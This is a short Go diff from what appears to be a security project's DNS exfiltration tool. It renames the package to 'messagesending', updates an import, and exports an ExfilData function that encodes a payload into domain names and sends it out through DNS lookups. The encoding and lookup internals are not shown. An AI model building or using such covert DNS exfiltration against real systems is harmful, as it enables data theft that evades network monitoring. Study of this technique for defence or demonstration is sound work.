@@ -1,11 +1,11 @@
-package dnsexfiltool
+package messagesending
 
 import (
-	"github.com/sam-bee/security-itsalwaysdns/pkg/codec"
+	"github.com/sam-bee/security-itsalwaysdns/dns_exfil_tool/pkg/messageencoding"
 	"log"
 )
 
-func exfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
+func ExfilData(exfilPayload string, mainDomain string, dns DnsLookup) {
 	domains := domainsToQuery(exfilPayload, mainDomain)
 	performDnsLookups(domains, dns)
 }
@@ -21,5 +21,5 @@ func performDnsLookups(domains []string, dns DnsLookup) {
 }
 
 func domainsToQuery(exfilPayload string, mainDomain string) []string {
-	return codec.GetDomainsToLookUp(exfilPayload, mainDomain)
+	return messageencoding.GetDomainsToLookUp(exfilPayload, mainDomain)
 }
